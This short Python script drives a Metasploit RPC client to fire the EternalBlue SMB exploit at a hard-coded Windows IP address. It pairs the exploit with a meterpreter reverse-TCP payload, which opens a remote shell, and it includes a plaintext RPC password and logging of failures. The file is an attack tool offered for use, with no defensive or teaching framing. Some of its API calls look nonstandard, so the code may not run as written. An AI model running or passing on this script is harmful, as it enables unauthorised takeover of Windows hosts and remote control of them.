from metasploit.client import MsfRpcClient
import logging

logging.basicConfig(filename='exploit_errors.log', level=logging.ERROR)

def exploit_target(client, target_ip, exploit_name, payload_name):
    try:
        print(f"[+] Running exploit {exploit_name} on {target_ip}...")
        client.exploits.execute(exploit_name, target_ip=target_ip, payload=payload_name)
        print(f"[+] Exploit successful on {target_ip}")
    except Exception as e:
        logging.error(f"Failed on {target_ip}: {str(e)}")

def main():
    client = MsfRpcClient('password123')
    target_ip = '192.168.100.73'
    exploit_name = 'exploit/windows/smb/ms17_010_eternalblue'
    payload_name = 'windows/meterpreter/reverse_tcp'
    
    exploit_target(client, target_ip, exploit_name, payload_name)

if __name__ == '__main__':
    main()

